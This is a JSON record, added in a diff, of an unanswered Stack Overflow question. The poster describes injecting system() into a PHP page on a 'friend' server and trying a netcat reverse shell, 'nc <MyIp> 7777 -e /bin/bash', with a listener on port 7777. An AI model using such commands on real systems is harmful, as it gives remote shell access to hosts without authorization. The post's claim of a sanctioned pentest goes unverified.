@@ -1,0 +1,27 @@
+{
+  "question_id" : 44826930,
+  "title" : "Pentest - Cannot make reverse shell",
+  "body" : "<p>I'm making a pentest to a friend server and I successfully write <code>system()</code> on a php page of the server then I try to make a reverse shell to my terminal.</p>\n\n<p>I user NetCat to start listening my 7777 port <code>nc -vlnp 7777</code><br>\nAnd checked if NetCat was installed and yes.</p>\n\n<p>So send command to php <code>nc &lt;MyIp&gt; 7777 -e /bin/bash</code> to connect to my terminal\nYap don't worked, simply don't connect and yes a opened the port on my router.</p>\n\n<p>Anyone have a idea the why?</p>\n",
+  "link" : "https://stackoverflow.com/questions/44826930/pentest-cannot-make-reverse-shell",
+  "owner" : {
+    "user_id" : 8222493,
+    "user_type" : "registered",
+    "display_name" : "Samega 7Cattac",
+    "profile_image" : "https://www.gravatar.com/avatar/60bb1c967f8edaf50b289e18b7263e27?s=128&d=identicon&r=PG",
+    "link" : "https://stackoverflow.com/users/8222493/samega-7cattac",
+    "reputation" : 21,
+    "accept_rate" : null
+  },
+  "is_answered" : false,
+  "creation_date" : 1498743889,
+  "last_activity_date" : 1498743889,
+  "tags" : [
+    "php",
+    "bash",
+    "shell",
+    "netcat"
+  ],
+  "score" : 0,
+  "view_count" : 4,
+  "answer_count" : 0
+}
